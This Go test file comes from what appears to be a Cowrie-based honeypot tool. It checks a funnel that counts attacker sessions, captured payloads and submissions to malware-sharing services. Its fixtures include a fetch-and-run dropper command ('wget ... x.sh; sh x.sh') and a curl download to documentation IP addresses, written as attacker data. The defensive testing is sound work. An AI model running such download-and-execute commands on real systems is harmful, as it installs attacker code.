package store

import (
	"context"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func funnelEvent(t *testing.T, s *Store, ts time.Time, kind models.EventKind, session, command string) {
	t.Helper()
	if err := s.InsertEvent(&models.Event{TS: ts, Source: models.SourceCowrie, Kind: kind, SrcIP: "203.0.113.9", SessionID: session, Command: command}); err != nil {
		t.Fatal(err)
	}
}

func funnelArtifact(t *testing.T, s *Store, url, sha, origin string, size int64, first, fetched time.Time) {
	t.Helper()
	if err := s.RecordArtifact(Artifact{TS: fetched, CreatedAt: first, FirstObservedAt: first, LastSuccessfulFetchAt: fetched, URL: url, SHA256: sha, SizeBytes: size, Origin: origin, Status: "fetched"}); err != nil {
		t.Fatal(err)
	}
}

func TestPayloadFunnelCountsEachStage(t *testing.T) {
	s := newTestStore(t, "funnel.db")
	now := time.Now().UTC()
	since := now.Add(-24 * time.Hour)
	in := now.Add(-time.Hour)
	old := now.Add(-48 * time.Hour)

	// s1: connect, login, a download command. s2: connect only.
	// s3: connect, login, recon. s4: an upload with no command.
	funnelEvent(t, s, in, models.KindConnect, "s1", "")
	funnelEvent(t, s, in, models.KindAccepted, "s1", "")
	funnelEvent(t, s, in, models.KindCommand, "s1", "cd /tmp; wget http://198.51.100.7/x.sh; sh x.sh")
	funnelEvent(t, s, in, models.KindConnect, "s2", "")
	funnelEvent(t, s, in, models.KindConnect, "s3", "")
	funnelEvent(t, s, in, models.KindAccepted, "s3", "")
	funnelEvent(t, s, in, models.KindCommand, "s3", "uname -a")
	funnelEvent(t, s, in, models.KindFileUp, "s4", "")
	// Outside the window: must not count.
	funnelEvent(t, s, old, models.KindConnect, "s9", "")
	funnelEvent(t, s, old, models.KindCommand, "s9", "curl https://198.51.100.8/y")

	pol := SharePolicy{MinBytes: 64, Origins: []string{"cowrie_download", "cowrie_file_download", "quarantine_fetch"}}
	funnelArtifact(t, s, "http://198.51.100.7/x.sh", "aaaa", "quarantine_fetch", 900, in, in)                 // new + captured
	funnelArtifact(t, s, "cowrie-download:bbbb", "bbbb", "cowrie_download", 4096, old.Add(-24*time.Hour), in) // captured, not new
	funnelArtifact(t, s, "cowrie-tty:cccc", "cccc", "cowrie_tty", 9000, in, in)                               // tty: excluded
	funnelArtifact(t, s, "cowrie-download:dddd", "dddd", "cowrie_download", 10, in, in)                       // < 64 B: excluded

	if err := s.RecordBazaarUpload(BazaarUpload{SHA256: "aaaa", UploadedAt: in, ResponseStatus: "inserted"}); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordBazaarUpload(BazaarUpload{SHA256: "bbbb", UploadedAt: in, ResponseStatus: "file_already_known"}); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordURLhausSubmission("http://198.51.100.7/x.sh", "ok", in); err != nil {
		t.Fatal(err)
	}
	if err := s.RecordThreatFoxSubmission("198.51.100.7:80", "ip:port", "elf.mirai", "ok", old); err != nil {
		t.Fatal(err)
	}

	got, err := s.PayloadFunnel(context.Background(), since, pol)
	if err != nil {
		t.Fatal(err)
	}
	want := FunnelCounts{Connected: 3, LoggedIn: 2, RanCommands: 2, DownloadAttempt: 2, Captured: 2, NewPayloads: 1, SharedBazaar: 1, SharedURLhaus: 1, SharedThreatFox: 0}
	if got != want {
		t.Fatalf("funnel = %+v, want %+v", got, want)
	}
}

func TestPayloadFunnelZeroPolicyCapturesNothing(t *testing.T) {
	s := newTestStore(t, "funnel-zero.db")
	now := time.Now().UTC()
	funnelArtifact(t, s, "cowrie-download:eeee", "eeee", "cowrie_download", 4096, now, now)
	got, err := s.PayloadFunnel(context.Background(), now.Add(-time.Hour), SharePolicy{})
	if err != nil {
		t.Fatal(err)
	}
	if got.Captured != 0 || got.NewPayloads != 0 {
		t.Fatalf("a zero SharePolicy must select nothing (fail closed), got %+v", got)
	}
}

func TestPayloadFunnelHonoursCancellation(t *testing.T) {
	s := newTestStore(t, "funnel-cancel.db")
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := s.PayloadFunnel(ctx, time.Now().Add(-time.Hour), SharePolicy{MinBytes: 64, Origins: []string{"quarantine_fetch"}}); err == nil {
		t.Fatal("a cancelled context must abort the funnel query")
	}
}
